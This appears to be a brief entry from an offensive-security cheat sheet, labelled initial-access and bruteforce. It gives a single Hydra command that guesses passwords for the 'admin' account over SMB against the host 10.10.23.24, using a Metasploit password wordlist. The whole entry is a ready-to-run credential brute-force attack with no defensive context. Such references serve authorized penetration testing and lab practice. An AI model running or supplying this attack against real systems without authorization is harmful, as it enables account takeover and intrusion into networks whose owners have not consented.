---
title: SMB Bruteforce with Hydra
category: initial-access
subcategory: bruteforce
os: linux
command: hydra -l user -P pass target smb
tools: hydra
---


### SMB password spray

```bash
hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.10.23.24 -t 4 smb
```
